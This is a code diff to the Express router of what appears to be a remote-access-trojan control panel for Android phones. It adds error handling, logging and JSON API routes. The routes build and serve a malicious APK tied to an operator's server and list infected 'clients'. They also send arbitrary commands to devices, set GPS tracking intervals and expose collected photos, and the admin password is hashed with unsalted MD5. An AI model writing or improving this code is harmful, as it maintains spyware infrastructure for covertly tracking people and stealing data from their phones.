@@ -5,44 +5,92 @@ const fs = require('fs');
 const config = require('./config');
 const db = require('./db');
 const clients = require('./clients');
-const logs = require('./logs');
+const { logger, getLogs, clearLogs, getStats } = require('./logs');
 const builder = require('./builder');
 
 const router = express.Router();
 
 // Auth middleware
 function auth(req, res, next) {
-    const token = db.main.get('admin.token').value();
-    if (req.cookies?.token === token && token) next();
-    else res.redirect('/login');
+    try {
+        const token = db.main.get('admin.token').value();
+        if (req.cookies?.token === token && token) {
+            next();
+        } else {
+            res.redirect('/login');
+        }
+    } catch (e) {
+        logger.systemError('Auth middleware failed', e);
+        res.redirect('/login');
+    }
 }
 
+// Request logging middleware
+function logRequest(req, res, next) {
+    const start = Date.now();
+    res.on('finish', () => {
+        const duration = Date.now() - start;
+        const status = res.statusCode >= 400 ? 'error' : 'success';
+        if (req.path !== '/builder/progress') { // Skip progress polling
+            logger.info(`${req.method} ${req.path} - ${res.statusCode} (${duration}ms)`, 'system');
+        }
+    });
+    next();
+}
+
+router.use(logRequest);
+
 // Login
-router.get('/login', (req, res) => res.render('login'));
+router.get('/login', (req, res) => {
+    res.render('login');
+});
+
 router.post('/login', express.urlencoded({ extended: true }), (req, res) => {
-    const { user, pass } = req.body;
-    const admin = db.main.get('admin').value();
-    const hash = crypto.createHash('md5').update(pass || '').digest('hex');
-    
-    if (user === admin.user && hash === admin.pass) {
-        const token = crypto.randomBytes(16).toString('hex');
-        db.main.get('admin').assign({ token }).write();
-        logs.log('success', `Admin logged in from ${req.ip}`);
-        res.cookie('token', token).redirect('/');
-    } else {
-        logs.log('error', `Failed login attempt from ${req.ip}`);
+    try {
+        const { user, pass } = req.body;
+        const admin = db.main.get('admin').value();
+        const hash = crypto.createHash('md5').update(pass || '').digest('hex');
+        
+        const ip = req.ip || req.connection.remoteAddress;
+        
+        if (user === admin.user && hash === admin.pass) {
+            const token = crypto.randomBytes(16).toString('hex');
+            db.main.get('admin').assign({ token }).write();
+            logger.loginSuccess(ip);
+            res.cookie('token', token).redirect('/');
+        } else {
+            logger.loginFailed(ip);
+            res.redirect('/login?error=1');
+        }
+    } catch (e) {
+        logger.systemError('Login failed', e);
         res.redirect('/login?error=1');
     }
 });
 
 router.get('/logout', (req, res) => {
-    db.main.get('admin').assign({ token: '' }).write();
-    res.clearCookie('token').redirect('/login');
+    try {
+        const ip = req.ip || req.connection.remoteAddress;
+        db.main.get('admin').assign({ token: '' }).write();
+        logger.logout(ip);
+        res.clearCookie('token').redirect('/login');
+    } catch (e) {
+        logger.systemError('Logout failed', e);
+        res.redirect('/login');
+    }
 });
 
 // Dashboard
 router.get('/', auth, (req, res) => {
-    res.render('index', { online: clients.online(), offline: clients.offline() });
+    try {
+        res.render('index', { 
+            online: clients.online(), 
+            offline: clients.offline() 
+        });
+    } catch (e) {
+        logger.systemError('Dashboard render failed', e);
+        res.status(500).send('Internal error');
+    }
 });
 
 // Builder
@@ -51,32 +99,74 @@ router.get('/builder', auth, (req, res) => {
 });
 
 router.post('/builder', auth, (req, res) => {
-    const { serverUrl, homePageUrl } = req.body;
-    logs.log('info', `Building APK for ${serverUrl}${homePageUrl ? ` with home page ${homePageUrl}` : ''}`);
-    
-    builder.buildApk(serverUrl, homePageUrl, (err) => {
-        if (err) {
-            logs.log('error', `Build failed: ${err}`);
-            res.json({ error: err });
-        } else {
-            logs.log('success', `APK built successfully for ${serverUrl}`);
-            res.json({ success: true });
+    try {
+        const { serverUrl, homePageUrl } = req.body;
+        
+        if (!serverUrl) {
+            logger.warning('Build attempted without server URL', 'build');
+            return res.json({ error: 'Server URL is required' });
         }
-    });
+        
+        logger.buildStart(serverUrl);
+        
+        builder.buildApk(serverUrl, homePageUrl, (err) => {
+            if (err) {
+                logger.buildFailed(err);
+                res.json({ error: err });
+            } else {
+                logger.buildSuccess(serverUrl);
+                res.json({ success: true });
+            }
+        });
+    } catch (e) {
+        logger.systemError('Builder route failed', e);
+        res.json({ error: e.message });
+    }
 });
 
 router.get('/builder/progress', auth, (req, res) => {
-    res.json({ progress: builder.getProgress() });
+    try {
+        res.json({ progress: builder.getProgress() });
+    } catch (e) {
+        res.json({ progress: { step: 'error', message: 'Failed to get progress' } });
+    }
 });
 
 // Logs
 router.get('/logs', auth, (req, res) => {
-    res.render('logs', { logs: logs.getLogs() });
+    try {
+        const { type, category, search, limit } = req.query;
+        const logs = getLogs({ 
+            type, 
+            category, 
+            search, 
+            limit: limit ? parseInt(limit) : 100 
+        });
+        const stats = getStats();
+        res.render('logs', { logs, stats, filters: { type, category, search } });
+    } catch (e) {
+        logger.systemError('Logs render failed', e);
+        res.status(500).send('Internal error');
+    }
 });
 
 router.post('/logs/clear', auth, (req, res) => {
-    logs.clearLogs();
-    res.json({ success: true });
+    try {
+        clearLogs();
+        res.json({ success: true });
+    } catch (e) {
+        logger.systemError('Clear logs failed', e);
+        res.json({ error: e.message });
+    }
+});
+
+// API: Get log stats
+router.get('/api/logs/stats', auth, (req, res) => {
+    try {
+        res.json(getStats());
+    } catch (e) {
+        res.json({ error: e.message });
+    }
 });
 
 // Device management
@@ -85,31 +175,50 @@ router.get('/device/:id', auth, (req, res) => {
 });
 
 router.get('/device/:id/:page', auth, (req, res) => {
-    const { id, page } = req.params;
-    const data = clients.getData(id, page);
-    
-    if (data) {
-        res.render('device', { id, page, data });
-    } else {
-        res.render('device', { id, page: 'notfound', data: {} });
+    try {
+        const { id, page } = req.params;
+        const data = clients.getData(id, page);
+        
+        if (data) {
+            res.render('device', { id, page, data });
+        } else {
+            res.render('device', { id, page: 'notfound', data: {} });
+        }
+    } catch (e) {
+        logger.systemError('Device page render failed', e);
+        res.status(500).send('Internal error');
     }
 });
 
 // Commands
 router.post('/cmd/:id/:cmd', auth, express.json(), (req, res) => {
-    const { id, cmd } = req.params;
-    const params = { ...req.query, ...req.body };
-    
-    logs.log('info', `Command ${cmd} sent to ${id}`);
-    clients.send(id, cmd, params, (err, msg) => {
-        res.json(err ? { error: err } : { success: true, message: msg });
-    });
+    try {
+        const { id, cmd } = req.params;
+        const params = { ...req.query, ...req.body };
+        
+        clients.send(id, cmd, params, (err, msg) => {
+            if (err) {
+                res.json({ error: err });
+            } else {
+                res.json({ success: true, message: msg });
+            }
+        });
+    } catch (e) {
+        logger.systemError('Command route failed', e);
+        res.json({ error: e.message });
+    }
 });
 
 // GPS polling
 router.post('/gps/:id/:interval', auth, (req, res) => {
-    clients.setGps(req.params.id, parseInt(req.params.interval) || 0);
-    res.json({ success: true });
+    try {
+        const { id, interval } = req.params;
+        clients.setGps(id, parseInt(interval) || 0);
+        res.json({ success: true });
+    } catch (e) {
+        logger.systemError('GPS route failed', e);
+        res.json({ error: e.message });
+    }
 });
 
 // Static downloads
@@ -118,11 +227,51 @@ router.use('/photos', express.static(config.photosPath));
 
 // Serve signed APK
 router.get('/build.s.apk', (req, res) => {
-    if (fs.existsSync(builder.signedApk)) {
-        res.download(builder.signedApk);
-    } else {
-        res.status(404).send('APK not found');
+    try {
+        if (fs.existsSync(builder.signedApk)) {
+            logger.info('APK downloaded', 'build');
+            res.download(builder.signedApk);
+        } else {
+            logger.warning('APK requested but not found', 'build');
+            res.status(404).send('APK not found. Build one first using the Builder page.');
+        }
+    } catch (e) {
+        logger.systemError('APK download failed', e);
+        res.status(500).send('Internal error');
     }
+});
+
+// API: Get client list
+router.get('/api/clients', auth, (req, res) => {
+    try {
+        res.json({
+            online: clients.online(),
+            offline: clients.offline(),
+            total: clients.all().length
+        });
+    } catch (e) {
+        res.json({ error: e.message });
+    }
+});
+
+// API: Get client info
+router.get('/api/client/:id', auth, (req, res) => {
+    try {
+        const client = clients.get(req.params.id);
+        if (client) {
+            res.json(client);
+        } else {
+            res.json({ error: 'Client not found' });
+        }
+    } catch (e) {
+        res.json({ error: e.message });
+    }
+});
+
+// Error handler
+router.use((err, req, res, next) => {
+    logger.systemError('Unhandled route error', err);
+    res.status(500).json({ error: 'Internal server error' });
 });
 
 module.exports = router;
